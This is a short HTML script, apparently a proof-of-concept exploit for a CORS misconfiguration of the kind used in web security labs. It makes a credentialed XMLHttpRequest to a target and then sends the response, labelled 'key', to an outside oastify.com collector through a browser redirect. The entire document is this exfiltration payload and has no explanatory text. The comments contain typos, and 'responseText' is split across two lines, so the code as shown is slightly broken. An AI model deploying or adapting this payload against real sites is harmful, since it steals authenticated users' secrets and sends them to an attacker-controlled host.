<script>
var req = new XMLHttpRequest();
var url = ("https://127.0.0.1");
//#MLHttpRequest object loads, exectutes reqListener() function
req.onload = retrieveKeys;
//#Make GET request to the application accounDetails location
req.open('GET', url ,true);
//#Allow passing credentials with the requests
req.withCredentials = true;
//#Send the request
req.send(null);
function retrieveKeys() {
location='https://nnefz89vu9pelpqh9zggijwkxb3ar0fp.oastify.com/log?key='+this.response
Text;
};
</script>
